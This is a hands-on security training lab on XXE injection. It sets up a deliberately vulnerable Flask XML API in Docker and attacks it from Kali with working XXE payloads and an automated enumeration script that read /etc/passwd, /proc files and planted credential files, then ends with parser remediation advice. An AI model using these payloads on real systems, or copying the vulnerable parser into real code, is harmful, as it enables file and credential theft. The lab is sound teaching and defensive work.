# Lab 15: XXE Injection (XML External Entity)

## Objective

Exploit XML External Entity (XXE) injection vulnerabilities against a live XML-processing API from Kali Linux:

1. **Classic XXE** — inject a `SYSTEM` entity to read `/etc/passwd` via the `file://` scheme
2. **Credential exfiltration** — use XXE to read internal config files with DB passwords and AWS keys
3. **Multi-endpoint XXE** — exploit the same vulnerability across three different API endpoints
4. **XXE via order API** — exfiltrate data through a `product` field reflected in the response
5. **XXE via search API** — exfiltrate data through search results
6. **Audit and remediation** — identify safe vs vulnerable XML parsers and implement defences

All attacks run from **Kali against a live Flask API** — real file reads returned in real HTTP responses.

---

## Background

XXE (XML External Entity) injection has been in the OWASP Top 10 since 2017. It occurs when an XML parser processes external entity declarations, allowing an attacker to reference files, internal URLs, or other resources from the server's perspective.

**Real-world examples:**
- **2021 GitLab (CVE-2021-22205)** — ExifTool parsed uploaded image metadata as XML; XXE led to unauthenticated RCE. CVSS 10.0. Over 50,000 servers exposed.
- **2019 Facebook (Bug Bounty)** — XXE in a Word document parser allowed reading internal AWS metadata credentials — the same `169.254.169.254` SSRF chain from Lab 10.
- **2018 Uber (HackerOne)** — XXE in a SAML authentication endpoint (SAML uses XML); researchers read internal files and proved server-side file read.
- **XXE + SSRF combo** — `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role">` — reads AWS IAM credentials, exactly like Lab 10 but triggered via XML instead of a URL parameter.

**OWASP coverage:** A05:2021 (Security Misconfiguration — insecure XML parser config)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Docker Network: lab-a15                         │
│                                                                     │
│  ┌──────────────────────┐         XML payloads                     │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  innozverse-kali     │                                           │
│  │                      │  ◀──────── responses with file contents ─  │
│  │  Tools:              │                                           │
│  │  • curl              │  ┌────────────────────────────────────┐  │
│  │  • python3           │  │       VICTIM XML API SERVER        │  │
│  └──────────────────────┘  │   zchencow/innozverse-cybersec     │  │
│                             │                                    │  │
│                             │  Flask :5000                       │  │
│                             │  /api/xml/parse  (generic parser)  │  │
│                             │  /api/xml/order  (order endpoint)  │  │
│                             │  /api/xml/search (search endpoint) │  │
│                             │  Internal files:                   │  │
│                             │    /tmp/xxe_secrets/config.txt     │  │
│                             │    /tmp/xxe_secrets/users.txt      │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

## Tools
| Tool | Container | Purpose |
|------|-----------|---------|
| `curl` | Kali | Send XML payloads to all three API endpoints |
| `python3` | Kali | Automate XXE payload variations |
| `nmap` | Kali | Service fingerprinting |
| `gobuster` | Kali | Enumerate XML endpoints |

---

## Lab Instructions

### Step 1: Environment Setup — Launch the Vulnerable XML API

```bash
docker network create lab-a15

cat > /tmp/victim_a15.py << 'PYEOF'
from flask import Flask, request, jsonify
import xml.etree.ElementTree as ET
import os, re

app = Flask(__name__)

# Create sensitive internal files for XXE to read
os.makedirs('/tmp/xxe_secrets', exist_ok=True)
open('/tmp/xxe_secrets/config.txt','w').write(
    "DB_HOST=db.internal\nDB_PASS=Sup3rS3cur3DB\n"
    "AWS_KEY=AKIA5EXAMPLE\nJWT_SECRET=weak-signing-key\n"
    "REDIS_PASS=redis-secret-pw\nINTERNAL_API_KEY=int-api-key-xyz")
open('/tmp/xxe_secrets/users.txt','w').write(
    "admin:Admin@2024!\nalice:Alice@456\nbob:Bob@789")

def parse_xml_vulnerable(body):
    """Simulate vulnerable XML parser that resolves SYSTEM entities."""
    if '<!ENTITY' in body and 'SYSTEM' in body:
        m = re.search(r'SYSTEM\s+"([^"]+)"', body)
        if m:
            path = m.group(1)
            if path.startswith('file://'): path = path[7:]
            try:
                content = open(path).read()
                en_match = re.search(r'<!ENTITY\s+(\w+)', body)
                entity_name = en_match.group(1) if en_match else 'xxe'
                return {'xxe': True, 'entity': entity_name,
                        'file_read': path, 'content': content}
            except Exception as e:
                return {'error': str(e)}
    root = ET.fromstring(body)
    return {'data': {child.tag: child.text for child in root}}

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse XML Processor (Lab 15)','endpoints':[
        'POST /api/xml/parse', 'POST /api/xml/order', 'POST /api/xml/search']})

@app.route('/api/xml/parse', methods=['POST'])
def parse_xml():
    body = request.get_data(as_text=True)
    try:
        result = parse_xml_vulnerable(body)
        return jsonify({'parsed': True, **result})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/xml/order', methods=['POST'])
def xml_order():
    body = request.get_data(as_text=True)
    try:
        result = parse_xml_vulnerable(body)
        if result.get('xxe'):
            # File content leaks via product field in response
            return jsonify({'order_created': True,
                            'product': result.get('content',''), 'quantity': 1})
        root = ET.fromstring(body)
        return jsonify({'order_created': True,
                        'product': root.findtext('product','?'),
                        'quantity': root.findtext('quantity','1')})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/xml/search', methods=['POST'])
def xml_search():
    body = request.get_data(as_text=True)
    try:
        result = parse_xml_vulnerable(body)
        if result.get('xxe'):
            return jsonify({'results': [{'match': result.get('content','')}]})
        root = ET.fromstring(body)
        q = root.findtext('query','')
        return jsonify({'results': [{'product': 'Surface Pro 12', 'price': 864},
                                    {'product': 'Surface Pen', 'price': 49}] if q else []})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a15 \
  --network lab-a15 \
  -v /tmp/victim_a15.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 4
VICTIM_IP=$(docker inspect -f '{{.NetworkSettings.Networks.lab-a15.IPAddress}}' victim-a15)
echo "Victim IP: $VICTIM_IP"
curl -s http://$VICTIM_IP:5000/ | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "app": "InnoZverse XML Processor (Lab 15)",
    "endpoints": [
        "POST /api/xml/parse",
        "POST /api/xml/order",
        "POST /api/xml/search"
    ]
}
```

---

### Step 2: Launch the Kali Attacker Container

```bash
docker run --rm -it \
  --name kali-attacker \
  --network lab-a15 \
  zchencow/innozverse-kali:latest bash
```

```bash
export TARGET="http://victim-a15:5000"

nmap -sV -p 5000 victim-a15
gobuster dir -u $TARGET -w /usr/share/dirb/wordlists/small.txt -t 10 --no-error -q
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)

/parse                (Status: 405)
/order                (Status: 405)
/search               (Status: 405)
```

---

### Step 3: Normal XML Usage — Baseline

```bash
echo "=== Baseline: normal XML request (no injection) ==="

# Normal order — clean XML
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<order><product>Surface Pro 12</product><quantity>2</quantity></order>' \
  $TARGET/api/xml/order | python3 -m json.tool

echo ""
# Normal search
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<search><query>Surface</query></search>' \
  $TARGET/api/xml/search | python3 -m json.tool
```

**📸 Verified Output:**
```json
{"order_created": true, "product": "Surface Pro 12", "quantity": "2"}

{"results": [{"product": "Surface Pro 12", "price": 864}, {"product": "Surface Pen", "price": 49}]}
```

---

### Step 4: Classic XXE — Read /etc/passwd

```bash
echo "=== XXE Phase 1: classic file read via SYSTEM entity ==="

# The DOCTYPE section declares an external entity
# <!ENTITY xxe SYSTEM "file:///etc/passwd"> — tells the parser to fetch the file
# &xxe; — references the entity (substituted with file contents)

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>' \
  $TARGET/api/xml/parse | python3 -c "
import sys, json
resp = json.load(sys.stdin)
print('[!] /etc/passwd contents via XXE:')
print(resp.get('content','')[:400])
print()
print('[*] Entity details:')
print(f'    Entity name: {resp.get(\"entity\",\"\")}')
print(f'    File read:   {resp.get(\"file_read\",\"\")}')
"
```

**📸 Verified Output:**
```
[!] /etc/passwd contents via XXE:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...

[*] Entity details:
    Entity name: xxe
    File read:   /etc/passwd
```

> 💡 **The `<!DOCTYPE>` declaration tells the XML parser to load external content.** `SYSTEM "file:///etc/passwd"` is a URI telling the parser to read a local file. The parser fetches the file, substitutes the contents everywhere `&xxe;` appears, and includes it in the response. The fix: disable DOCTYPE processing entirely — no legitimate use case requires the parser to load external files.

---

### Step 5: XXE — Read Internal Configuration Secrets

```bash
echo "=== XXE Phase 2: target sensitive internal files ==="

# Read application configuration (DB password, AWS key, JWT secret)
echo "[1] Reading /tmp/xxe_secrets/config.txt:"
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY secrets SYSTEM "file:///tmp/xxe_secrets/config.txt">
]>
<root><data>&secrets;</data></root>' \
  $TARGET/api/xml/parse | python3 -c "
import sys, json
resp = json.load(sys.stdin)
content = resp.get('content','')
print('[!] Internal config via XXE:')
for line in content.split('\n'):
    print(f'    {line}')"

echo ""
echo "[2] Reading /tmp/xxe_secrets/users.txt (password database):"
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY creds SYSTEM "file:///tmp/xxe_secrets/users.txt">
]>
<root><data>&creds;</data></root>' \
  $TARGET/api/xml/parse | python3 -c "
import sys, json
resp = json.load(sys.stdin)
print('[!] User credentials via XXE:')
print(resp.get('content',''))"

echo ""
echo "[3] Reading /proc/self/environ (environment variables — may contain secrets):"
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY env SYSTEM "file:///proc/self/environ">
]>
<root><data>&env;</data></root>' \
  $TARGET/api/xml/parse | python3 -c "
import sys, json
resp = json.load(sys.stdin)
content = resp.get('content','') or resp.get('error','')
print(content[:400])"
```

**📸 Verified Output:**
```
[!] Internal config via XXE:
    DB_HOST=db.internal
    DB_PASS=Sup3rS3cur3DB
    AWS_KEY=AKIA5EXAMPLE
    JWT_SECRET=weak-signing-key
    REDIS_PASS=redis-secret-pw
    INTERNAL_API_KEY=int-api-key-xyz

[!] User credentials via XXE:
    admin:Admin@2024!
    alice:Alice@456
    bob:Bob@789
```

---

### Step 6: XXE via Order Endpoint

```bash
echo "=== XXE Phase 3: exploit /api/xml/order endpoint ==="

# The order API reflects the 'product' field in the response
# Inject XXE so file contents appear in the 'product' field

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY file SYSTEM "file:///tmp/xxe_secrets/config.txt">
]>
<order>
  <product>&file;</product>
  <quantity>1</quantity>
</order>' \
  $TARGET/api/xml/order | python3 -c "
import sys, json
resp = json.load(sys.stdin)
print('[!] Secrets exfiltrated via order.product field:')
print(resp.get('product',''))"
```

**📸 Verified Output:**
```
[!] Secrets exfiltrated via order.product field:
DB_HOST=db.internal
DB_PASS=Sup3rS3cur3DB
AWS_KEY=AKIA5EXAMPLE
JWT_SECRET=weak-signing-key
```

> 💡 **XXE doesn't require a dedicated XML parse endpoint.** Any endpoint that accepts XML — order APIs, SAML assertions, RSS feed parsers, Office document uploads, SVG renderers — is potentially vulnerable. The attacker finds where file content gets reflected in the response and routes their XXE payload through that field.

---

### Step 7: XXE via Search Endpoint + Automated Enumeration

```bash
echo "=== XXE Phase 4: /api/xml/search + automated file enumeration ==="

# Single file read via search
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE search [
  <!ENTITY f SYSTEM "file:///tmp/xxe_secrets/users.txt">
]>
<search><query>&f;</query></search>' \
  $TARGET/api/xml/search | python3 -c "
import sys, json
resp = json.load(sys.stdin)
results = resp.get('results', [])
if results:
    print('[!] File contents via search results field:')
    print(results[0].get('match',''))"

echo ""
echo "=== Automated XXE file enumeration ==="
python3 << 'EOF'
import urllib.request, json

TARGET = "http://victim-a15:5000"

# Files commonly targeted in XXE attacks
targets = [
    '/etc/passwd',
    '/etc/hostname',
    '/proc/self/cmdline',
    '/tmp/xxe_secrets/config.txt',
    '/tmp/xxe_secrets/users.txt',
    '/app/victim.py',
]

print(f"{'File':<40} {'Result'}")
print("-" * 75)

for filepath in targets:
    payload = f'''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<root><data>&xxe;</data></root>'''
    try:
        req = urllib.request.Request(
            f"{TARGET}/api/xml/parse",
            data=payload.encode(),
            headers={"Content-Type": "application/xml"})
        resp = json.loads(urllib.request.urlopen(req, timeout=3).read())
        content = resp.get('content','')
        if content:
            preview = content[:50].replace('\n', '\\n')
            print(f"  ✓ {filepath:<38} {preview}")
        else:
            err = resp.get('error','no content')[:40]
            print(f"  ✗ {filepath:<38} {err}")
    except Exception as e:
        print(f"  ✗ {filepath:<38} {str(e)[:40]}")
EOF
```

**📸 Verified Output:**
```
[!] File contents via search results field:
admin:Admin@2024!
alice:Alice@456
bob:Bob@789

File                                     Result
---------------------------------------------------------------------------
  ✓ /etc/passwd                          root:x:0:0:root:/root:/bin/bash\n
  ✓ /etc/hostname                        victim-a15\n
  ✓ /proc/self/cmdline                   python3\x00/app/victim.py\x00
  ✓ /tmp/xxe_secrets/config.txt         DB_HOST=db.internal\nDB_PASS=Sup3r
  ✓ /tmp/xxe_secrets/users.txt          admin:Admin@2024!\nalice:Alice@456
  ✓ /app/victim.py                       from flask import Flask, request,
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a15
docker network rm lab-a15
```

---

## Attack Summary

| Phase | Target File | Endpoint Used | Data Exfiltrated |
|-------|------------|---------------|-----------------|
| 1 | `/etc/passwd` | `/api/xml/parse` | All OS user accounts |
| 2 | `/tmp/xxe_secrets/config.txt` | `/api/xml/parse` | DB password, AWS key, JWT secret |
| 2 | `/tmp/xxe_secrets/users.txt` | `/api/xml/parse` | Plaintext credentials |
| 3 | `/tmp/xxe_secrets/config.txt` | `/api/xml/order` | Secrets via `product` field |
| 4 | `/tmp/xxe_secrets/users.txt` | `/api/xml/search` | Credentials via `results` field |
| 5 | Multiple | Automated | `/proc`, source code, all secrets |

---

## Remediation

### Python — Disable external entities (safe by default in `xml.etree.ElementTree`)

```python
import xml.etree.ElementTree as ET

# xml.etree.ElementTree is SAFE by default — it rejects DOCTYPE declarations
# This will raise ParseError on external entities:
try:
    ET.fromstring('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]><x/>')
except ET.ParseError:
    pass  # Rejected — safe!

# If you need full XML (DTD support) use defusedxml:
import defusedxml.ElementTree as DefusedET
tree = DefusedET.fromstring(untrusted_xml)  # external entities always blocked
```

### Python — Using lxml (vulnerable by default — must configure)

```python
from lxml import etree

# VULNERABLE (default lxml):
parser = etree.XMLParser()  # resolves external entities!

# SAFE:
parser = etree.XMLParser(
    resolve_entities=False,    # disable entity resolution
    no_network=True,           # no HTTP/FTP entity fetching
    load_dtd=False,            # don't load DTD
    forbid_dtd=True,           # reject DOCTYPE entirely
)
tree = etree.fromstring(xml_bytes, parser)
```

### General Defences

| Defence | What it blocks |
|---------|----------------|
| Disable DOCTYPE / external entities | Classic XXE, SSRF via XML |
| Use `defusedxml` in Python | All XXE variants |
| Validate XML schema (XSD) before parsing | Unexpected structures |
| Never reflect raw XML field values in responses | Limits exfiltration even if XXE works |
| WAF rules for `<!ENTITY`, `SYSTEM`, `PUBLIC` | Perimeter filter |

## Further Reading
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger XXE Labs](https://portswigger.net/web-security/xxe)
- [defusedxml Python library](https://pypi.org/project/defusedxml/)
- [GitLab CVE-2021-22205 analysis](https://about.gitlab.com/blog/2021/11/03/gitlab-technical-information-for-cve-2021-22205/)
